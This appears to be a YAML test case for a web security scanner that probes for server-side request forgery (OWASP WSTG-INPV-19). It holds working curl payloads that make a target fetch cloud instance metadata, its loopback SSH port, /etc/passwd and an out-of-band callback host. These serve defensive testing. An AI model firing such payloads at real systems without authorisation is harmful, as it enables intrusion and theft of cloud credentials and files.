id: WSTG-INPV-19
name: Server-Side Request Forgery
category: Input Validation
# All PAYLOAD: each of these is put in a parameter VALUE for THE TARGET to
# fetch. erlik connects only to `url`, and an SSRF probe that may not name an
# address other than the target is not a probe.
#
#   169.254.169.254            AWS/Azure instance metadata (RFC 3927 link-local)
#   metadata.google.internal   the GCP equivalent
#   localhost                  the TARGET's own loopback, the classic
#                              internal-service reach
payload_hosts:
  - 169.254.169.254
  - metadata.google.internal
  - localhost

attack_class: ssrf
severity: high
references:
  - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-side_Request_Forgery

# The user supplies a URL endpoint and a parameter name known to fetch a
# user-controlled URL (?url=, ?fetch=, ?next=, ?image=, etc.). We do NOT
# auto-discover these — that's recon's job.
# The four in-band probes prove SSRF when the fetched document comes back in
# the response. They cannot prove BLIND SSRF -- where the request is made and
# the response discarded -- which is the common case behind a firewall. That
# needs an out-of-band name and a poll afterwards; see
# orchestrator/collaborator.py.
needs_collaborator: true

target_schema:
  required: [url, parameter]
  # `cookie` is what lets this reach an endpoint behind a login. Every probe
  # sends it. Without it the case fetched a 302 to the login form, matched none
  # of its evidence patterns, and reported CLEAN on a page it never reached —
  # the same false negative INPV-05 had. An SSRF sink is very often behind
  # auth, so this is the normal case, not an edge one.
  optional: [collaborator_host, cookie]

steps:
  - name: cloud_metadata_aws
    tool: curl
    command: >-
      curl -s -b "{{cookie}}" "{{url}}?{{parameter}}=http://169.254.169.254/latest/meta-data/"
    evaluators:
      - type: regex
        pattern: 'ami-id|instance-id|iam/|placement/|hostname$|local-hostname'
        emit_finding:
          vuln_type: SSRF (AWS IMDS reachable)
          severity: critical

  - name: cloud_metadata_gcp
    tool: curl
    when: no_finding_yet
    command: >-
      curl -s -b "{{cookie}}" -H "Metadata-Flavor: Google" "{{url}}?{{parameter}}=http://metadata.google.internal/computeMetadata/v1/"
    evaluators:
      - type: regex
        pattern: 'instance/|project/|service-accounts/'
        emit_finding:
          vuln_type: SSRF (GCP metadata reachable)
          severity: critical

  - name: internal_loopback
    tool: curl
    when: no_finding_yet
    command: >-
      curl -s -b "{{cookie}}" "{{url}}?{{parameter}}=http://127.0.0.1:22"
    evaluators:
      - type: regex
        pattern: 'SSH-\d|OpenSSH'
        emit_finding:
          vuln_type: SSRF (internal SSH port reachable)
          severity: high

  - name: file_scheme
    tool: curl
    when: no_finding_yet
    command: >-
      curl -s -b "{{cookie}}" "{{url}}?{{parameter}}=file:///etc/passwd"
    evaluators:
      - type: regex
        pattern: 'root:.*:0:0:|/bin/(bash|sh)'
        emit_finding:
          vuln_type: SSRF (file:// scheme — local file disclosure)
          severity: critical

  - name: llm_judge_ambiguous
    tool: curl
    when: no_finding_yet
    command: >-
      curl -s -b "{{cookie}}" "{{url}}?{{parameter}}=http://localhost:80"
    evaluators:
      - type: llm
        instruction: >-
          The endpoint may fetch a user-supplied URL. The response is what
          came back when we asked it to fetch http://localhost:80. Set
          matched=true if the response looks like content from an *internal*
          service (e.g. internal admin page, default web server banner,
          unexpected HTML) rather than a clean error or the parameter being
          rejected. False positives are acceptable here — we'll verify
          manually.
        emit_finding:
          vuln_type: SSRF (suspected — LLM judged)
          severity: medium

  # BLIND SSRF. The only probe here that does not depend on the fetched
  # document coming back: the payload asks the target to call a name minted for
  # this run, and the evidence is that something did.
  #
  # `oob: true` means the step is NOT RUN when no collaborator is configured.
  # Planting a payload nobody can read back would leave this case reporting a
  # clean verdict for a check that never happened; instead the run records that
  # out-of-band detection was unavailable.
  #
  # No evaluator: there is nothing in this response to match on, which is the
  # whole point of a blind probe. The finding comes from the runner's poll.
  - name: blind_callback
    tool: curl
    oob: true
    command: >-
      curl -s -b "{{cookie}}" -o /dev/null --connect-timeout 5 --max-time 15
      "{{url}}?{{parameter}}=http://{{collaborator_host}}/erlik-oob"
    evaluators: []
